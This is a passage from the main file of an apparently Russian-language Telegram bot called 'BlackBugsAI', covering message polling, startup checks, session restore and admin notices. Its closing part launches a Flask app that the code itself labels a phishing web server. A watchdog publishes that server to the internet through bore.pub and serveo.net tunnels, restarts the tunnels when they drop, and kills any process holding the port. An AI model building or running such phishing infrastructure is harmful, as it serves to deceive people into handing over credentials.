            'path':     dest_path,
            'filename': filename,
            'analysis': result,
        }

        analysis_preview = result[:3500] if len(result) > 3500 else result
        send_message(
            "📂 <b>{}</b>\n\n{}\n\n<b>Что делать дальше?</b>".format(filename, analysis_preview),
            chat_id, reply_markup=after_file_keyboard()
        )
        return

    # Если активна чат-сессия — добавляем в историю
    if chat_sess and isinstance(chat_sess, dict):
        from chat_agent import add_to_history
        add_to_history(chat_id, 'user', '[Файл: {}] {}'.format(filename, hint))
        add_to_history(chat_id, 'assistant', result[:500])

    # Telegram лимит 4096 символов на сообщение
    if len(result) > 4096:
        # Отправляем частями
        chunks = [result[i:i+4000] for i in range(0, len(result), 4000)]
        for i, chunk in enumerate(chunks):
            suffix = " ({}/{})".format(i+1, len(chunks)) if len(chunks) > 1 else ""
            send_message(chunk + suffix, chat_id,
                        reply_markup=chat_control_keyboard() if sess else kb(
                            [btn("📋 Меню", "menu")]
                        ))
    else:
        send_message(result, chat_id,
                    reply_markup=chat_control_keyboard() if sess else kb(
                        [btn("📋 Меню", "menu"),
                         btn("💬 Обсудить в чате", "agent_chat_start")]
                    ))



def _show_models_page(chat_id, models, page=0, msg_id=None):
    """Показывает страницу бесплатных моделей с кнопками."""
    text, buttons_data = format_free_models_keyboard(models, page=page)

    # Конвертируем buttons_data в kb() формат
    rows = []
    for row in buttons_data:
        rows.append([btn(label, cb) for label, cb in row])
    rows.append([back_btn("menu_llm")])

    markup = kb(*rows) if rows else None
    if msg_id:
        edit_message(chat_id, msg_id, text, reply_markup=markup)
    else:
        send_message(text, chat_id, reply_markup=markup)


def poll():
    offset = 0
    print("🤖 Polling запущен. Отправь /menu боту.", flush=True)

    # Авто-проверка текущего провайдера при старте (только читаем, не меняем)
    def _startup_check():
        import time as _t; _t.sleep(3)
        provider = config.LLM_PROVIDER
        model    = config.LLM_MODEL
        # Берём ключ специфичный для провайдера
        from llm_checker import _get_key_for_provider
        key = _get_key_for_provider(provider)
        result = check_provider(provider, api_key=key)
        if result['ok']:
            print("  ✅ LLM {}/{} — OK".format(provider, model), flush=True)
        else:
            err = result['error'] or 'недоступен'
            no_key = not key
            if no_key:
                print("  ⚠️ LLM {} — нет ключа в .env".format(provider), flush=True)
            else:
                print("  ❌ LLM {} — {}".format(provider, err), flush=True)
            print("     → /menu → 🧠 LLM → 🔍 Проверить провайдеры", flush=True)
    _run_in_thread(_startup_check)
    while not _gs.poll_should_stop():
        try:
            updates = get_updates(offset)
            for upd in updates:
                offset = upd['update_id'] + 1  # ← подтверждаем апдейт СРАЗУ

                # Inline-кнопка нажата
                if 'callback_query' in upd:
                    try:
                        handle_callback(upd['callback_query'])
                    except Exception as e:
                        print("⚠️ Callback dispatch error: {}".format(e), flush=True)
                    continue

                # Обычное сообщение (текст или файл)
                msg  = upd.get('message', {})
                cid  = str(msg.get('chat', {}).get('id', ''))
                if not cid:
                    continue

                # Файл / документ
                doc = msg.get('document')
                if doc:
                    try:
                        handle_document(msg, cid)
                    except Exception as e:
                        send_message("❌ Ошибка обработки файла: {}".format(e), cid)
                    continue

                # Фото — анализ через Vision если агент активен
                photos = msg.get('photo')
                if photos:
                    try:
                        handle_photo(msg, cid)
                    except Exception as e:
                        send_message("❌ Ошибка обработки фото: {}".format(e), cid)
                    continue

                # Текст
                text = msg.get('text', '')
                if text:
                    try:
                        # Пробрасываем данные профиля для auth_start
                        from_data = msg.get('from', {})
                        handle_text(text, cid,
                                    username=from_data.get('username'),
                                    first_name=from_data.get('first_name'))
                    except Exception as e:
                        send_message("❌ Ошибка: {}".format(e), cid)

        except Exception as e:
            print("⚠️ Poll outer error: {}".format(e), flush=True)
        time.sleep(2)


# ══════════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════════

def _validate_startup_config():
    """Проверяет конфиг при старте — авто-исправляет известные проблемы."""
    from llm_checker import RECOMMENDED
    provider = config.LLM_PROVIDER
    model    = config.LLM_MODEL
    rec = RECOMMENDED.get(provider, [])
    if rec and model not in rec:
        suggested = rec[0]
        print(f"  ⚠️ Модель '{model}' недоступна у {provider}. Авто: '{suggested}'", flush=True)
        _update_env('LLM_MODEL', suggested)
        config.reload()
    from llm_client import _PROVIDER_KEY_MAP
    key_attr = _PROVIDER_KEY_MAP.get(provider, 'LLM_API_KEY')
    has_key  = bool(getattr(config, key_attr, '') or config.LLM_API_KEY)
    if not has_key and provider != 'ollama':
        print(f"  ⚠️ Нет API ключа для {provider}! /menu → 🧠 LLM → {provider} → 🔑", flush=True)


def main():
    print(config.startup_banner(), flush=True)
    print(f"📁 Директория: {config.BASE_DIR}", flush=True)
    _validate_startup_config()
    print("🧠 LLM: {} / {}".format(config.LLM_PROVIDER, config.LLM_MODEL), flush=True)
    print("🎙  TTS: {} / {}".format(config.TTS_PROVIDER, config.TTS_VOICE), flush=True)

    # ── Graceful shutdown ───────────────────────────────────────────────────
    if GS_ENABLED:
        _gs.setup()
        _gs.register_notify(send_message)

    init_db()                     # БД новостей
    init_auth_db()

    # ── Structured logging ──────────────────────────────────────────────────
    if SLOG_ENABLED:
        LOG.info("АВТОМУВИ стартует", extra={'llm': config.LLM_PROVIDER})

    # ── Task queue workers ──────────────────────────────────────────────────
    if QUEUE_ENABLED:
        start_workers(n=2)

    # Восстанавливаем сессии после рестарта
    try:
        from chat_agent import restore_sessions
        restored_ids = restore_sessions()
        if restored_ids:
            def _notify_restored():
                import time as _t; _t.sleep(5)  # даём боту время стартовать
                for cid in restored_ids:
                    try:
                        from chat_agent import session_info
                        info = session_info(cid)
                        if info:
                            mode_name = "💬 Чат" if info['mode'] == 'chat' else "💻 Агент-кодер"
                            send_message(
                                f"🔄 <b>Бот перезапустился.</b>\n"
                                f"Твоя сессия {mode_name} восстановлена.\n"
                                f"История: {info['messages']} сообщений.\n\n"
                                f"<i>Продолжай как ни в чём не бывало.</i>",
                                cid, reply_markup=chat_control_keyboard()
                            )
                    except Exception:
                        pass
            threading.Thread(target=_notify_restored, daemon=True).start()
    except Exception as _re:
        print(f"  ⚠️ Не удалось восстановить сессии: {_re}", flush=True)

    # Удаляем вебхук если был — иначе getUpdates не работает
    delete_webhook()

    schedule.every(config.PARSE_INTERVAL_HOURS).hours.do(scheduled_cycle)
    threading.Thread(target=_run_scheduler, daemon=True).start()

    # Инициализация модуля авторизации
    # Инициализация модуля авторизации (синхронная)
    init_auth_db()

    # ── Admin Web Panel ──────────────────────────────────────────────────────
    try:
        from admin_web import start_admin_web
        start_admin_web()
    except Exception as _awe:
        print(f"  ⚠️ Admin Web не запустился: {_awe}", flush=True)

    # ── Watchdog для туннелей: авто-перезапуск при обрыве ───────────
    def _tunnel_watchdog():
        """Следит за bore/serveo, перезапускает если упали."""
        import time as _tw
        while True:
            _tw.sleep(30)
            if not FISH_ENABLED:
                continue
            try:
                # bore
                if (fish_bot_state.bore_process is not None and
                        fish_bot_state.bore_process.poll() is not None):
                    print("  🔄 bore упал, перезапускаю...", flush=True)
                    fish_bot_state.bore_process = None
                    fish_bot_state.bore_url     = None
                    # Тихий перезапуск bore
                    port = _fish_cfg.SERVER_PORT
                    if shutil.which("bore"):
                        proc = subprocess.Popen(
                            ["bore", "local", str(port), "--to", "bore.pub"],
                            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                            text=True, bufsize=1,
                        )
                        fish_bot_state.bore_process = proc
                        import re as _re2
                        for line in proc.stdout:
                            m = _re2.search(r"bore\.pub:(\d+)", line)
                            if m:
                                fish_bot_state.bore_url = "http://bore.pub:{}".format(m.group(1))
                                print("  ✅ bore перезапущен: {}".format(fish_bot_state.bore_url), flush=True)
                                break

                # serveo
                if (fish_bot_state.serveo_process is not None and
                        fish_bot_state.serveo_process.poll() is not None):
                    print("  🔄 serveo упал, перезапускаю...", flush=True)
                    fish_bot_state.serveo_process = None
                    fish_bot_state.serveo_url     = None
                    if shutil.which("ssh"):
                        proc = subprocess.Popen(
                            ["ssh", "-o", "StrictHostKeyChecking=no",
                             "-o", "ServerAliveInterval=30",
                             "-o", "ServerAliveCountMax=3",
                             "-o", "ExitOnForwardFailure=yes",
                             "-R", "80:localhost:{}".format(_fish_cfg.SERVER_PORT),
                             "serveo.net"],
                            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                            text=True, bufsize=1,
                        )
                        fish_bot_state.serveo_process = proc
                        import re as _re3
                        for line in proc.stdout:
                            m = _re3.search(r"https://[a-zA-Z0-9-]+\.serveo\.net", line)
                            if m:
                                fish_bot_state.serveo_url = m.group(0)
                                print("  ✅ serveo перезапущен: {}".format(fish_bot_state.serveo_url), flush=True)
                                break
            except Exception as _we:
                print("  ⚠️ tunnel watchdog: {}".format(_we), flush=True)

    threading.Thread(target=_tunnel_watchdog, daemon=True, name="tunnel-watchdog").start()

    # Startup broadcast to admin
    admin_ids = []
    try:
        from admin_module import _load_admin_ids
        admin_ids = list(_load_admin_ids())
    except Exception:
        pass
    for _aid in admin_ids[:3]:  # не спамим
        try:
            send_message(
                "🤖 <b>BlackBugsAI запущен!</b>\n"
                "LLM: {} / {}\n"
                "TTS: {} / {}\n\n"
                "👇 Нажми меню для управления".format(
                    config.LLM_PROVIDER, config.LLM_MODEL,
                    config.TTS_PROVIDER, config.TTS_VOICE),
                _aid, reply_markup=menu_keyboard(_aid)
            )
        except Exception:
            pass

    # ── Запускаем Flask (фишинг веб-сервер) в отдельном потоке ──
    if FISH_ENABLED:
        try:
            fish_db.init_db()
            from fish_web import app as fish_app

            import socket as _sock
            import time as _t

            _p = _fish_cfg.SERVER_PORT

            def _kill_port(port):
                """Убиваем процесс занявший порт — кросс-платформенно."""
                import sys as _sys2

                if _sys2.platform == 'win32':
                    # Windows: netstat + taskkill
                    try:
                        import subprocess as _sp2
                        r = _sp2.run(
                            ['netstat', '-ano', '-p', 'TCP'],
                            capture_output=True, text=True, timeout=5
                        )
                        for line in r.stdout.splitlines():
                            if f':{port} ' in line and 'LISTENING' in line:
                                pid = line.strip().split()[-1]
                                if pid.isdigit():
                                    _sp2.run(['taskkill', '/F', '/PID', pid],
                                              capture_output=True, timeout=3)
                    except Exception:
                        pass
                    return

                # Linux/macOS: fuser → /proc → lsof
                try:
                    subprocess.run(
                        ["fuser", "-k", "{}/tcp".format(port)],
                        capture_output=True, timeout=5
                    )
                except Exception:
                    pass
                # /proc (Linux)
                try:
                    inode_target = None
                    with open("/proc/net/tcp", "r") as _pf:
                        for line in _pf:
                            parts = line.split()
                            if len(parts) < 4:
                                continue
                            local = parts[1]
                            hex_port = local.split(":")[1] if ":" in local else ""
                            if hex_port and int(hex_port, 16) == port:
                                inode_target = parts[9] if len(parts) > 9 else None
                                break
                    if inode_target:
                        import os as _os
                        for pid in _os.listdir("/proc"):
                            if not pid.isdigit():
                                continue
                            fd_dir = "/proc/{}/fd".format(pid)
                            try:
                                for fd in _os.listdir(fd_dir):
                                    link = _os.readlink("{}/{}".format(fd_dir, fd))
                                    if "socket:[{}]".format(inode_target) in link:
                                        _os.kill(int(pid), 9)
                                        break
                            except Exception:
                                continue
                except Exception:
                    pass
                # lsof fallback (macOS / Linux)
                try:
                    import subprocess as _sp3
                    r = _sp3.run(['lsof', '-ti', f'tcp:{port}'],
                                 capture_output=True, text=True, timeout=5)
                    for pid_str in r.stdout.split():
                        if pid_str.isdigit():
                            _os.kill(int(pid_str), 9)
                except Exception:
                    pass

            def _port_free(port):
                """
                Честная проверка: свободен ли порт для нового процесса.

                ВАЖНО: НЕ используем SO_REUSEPORT здесь — иначе тест даёт
                ложноположительный результат. Flask (Werkzeug) создаёт сокет
                без SO_REUSEPORT, поэтому тест должен имитировать именно его
                поведение. Только SO_REUSEADDR — чтобы игнорировать TIME_WAIT
                так же как это делает Werkzeug по умолчанию.
                """
                with _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM) as s:
                    s.setsockopt(_sock.SOL_SOCKET, _sock.SO_REUSEADDR, 1)
                    try:
                        s.bind(("0.0.0.0", port))
                        return True
                    except OSError:
                        return False

            # В Docker убивать процессы по порту не нужно — просто ждём
            if not _port_free(_p):
                print(f"  ⚠️ Порт {_p} занят, жду освобождения...", flush=True)
                freed = False
                for _attempt in range(15):
                    _t.sleep(1)
                    if _port_free(_p):
                        freed = True
                        print(f"  ✅ Порт {_p} свободен", flush=True)
                        break
                if not freed:
                    print(f"  ⚠️ Порт {_p} всё ещё занят — Flask попробует запустить с SO_REUSEADDR", flush=True)

            if not fish_bot_state.server_running:
                def _run_fish_flask():
                    fish_bot_state.server_running = True
                    try:
                        # В Docker используем SO_REUSEPORT чтобы не ждать TIME_WAIT
                        import socket as _s2
                        flask_sock = _s2.socket(_s2.AF_INET, _s2.SOCK_STREAM)
                        flask_sock.setsockopt(_s2.SOL_SOCKET, _s2.SO_REUSEADDR, 1)
                        try:
                            flask_sock.setsockopt(_s2.SOL_SOCKET, _s2.SO_REUSEPORT, 1)
                        except (AttributeError, OSError):
                            pass  # Windows не поддерживает SO_REUSEPORT
                        flask_sock.close()
                        fish_app.run(
                            host=_fish_cfg.SERVER_HOST,
                            port=_p,
                            debug=False, threaded=True, use_reloader=False
                        )
                    except OSError as flask_err:
                        # Последний шанс — пробуем ещё раз через секунду
                        # (TIME_WAIT мог только что истечь)
                        print(f"  ⚠️ Flask: {flask_err}, повторная попытка через 3 сек...", flush=True)
                        _t.sleep(3)
                        try:
                            fish_app.run(
                                host=_fish_cfg.SERVER_HOST,
                                port=_p,
                                debug=False, threaded=True, use_reloader=False
                            )
                        except Exception as e2:
                            print(f"  ❌ Flask не запустился: {e2}", flush=True)
                    finally:
                        fish_bot_state.server_running = False

                threading.Thread(target=_run_fish_flask, daemon=True, name="fish-flask-auto").start()
                print(f"  🎣 Fish Flask запускается на порту {_p}...", flush=True)
        except Exception as _fe:
            print(f"  ⚠️ Fish Flask не запустился: {_fe}", flush=True)

    poll()

if __name__ == '__main__':
    main()